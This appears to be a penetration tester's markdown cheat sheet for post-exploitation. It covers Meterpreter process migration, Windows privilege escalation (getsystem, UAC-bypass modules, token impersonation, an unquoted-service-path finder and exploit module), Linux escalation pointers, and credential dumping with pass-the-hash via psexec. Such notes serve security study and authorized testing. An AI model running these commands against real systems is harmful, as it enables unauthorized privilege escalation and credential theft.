# Stable
## MSF Migrate
* `migrate` to a process that has higher chances of not being killed (e.g. from browser processes to system processes)
* `run <double_tabs>` - select meterpreter scripts

# Privileged
## Windows Privilege Escalation
#### Metasploit
* `meterpreter> getsystem` - doesn't work when UAC is enabled and user is not admin
* `meterpreter> post/windows/gather/win_privs` - check UAC enabled
* `msf> search bypassuac` - `use` module, `set` configs and `exploit`
  * `meterpreter> getsystem` - will work if user on the new session is admin (with UAC enabled also)
* `meterpreter> use incognito` - use commands from this module (e.g. _list_tokens_)

#### General
* unquoted service paths
  * `wmic service get name,displayname,pathname,startmode | findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """` - find unquoted services
  * `msf> use exploit/windows/local/trusted_service_path` - module for exploiting unquoted path vulnerable instances

## Linux Privilege Escalation
* SUDO - https://gtfobins.github.io/
* SUID - https://gtfobins.github.io/#+suid
* Replace executable
* crontab
* root squashing

# Persistent
#### Hashes
* `meterpreter> run hashdump` - if it crashes (elevate privileges or migrate to another process)
* pass-the-hash -> `use exploit/windows/smb/psexec` - works with administrator account (possible issues with users in Admin group, but not Administrator)
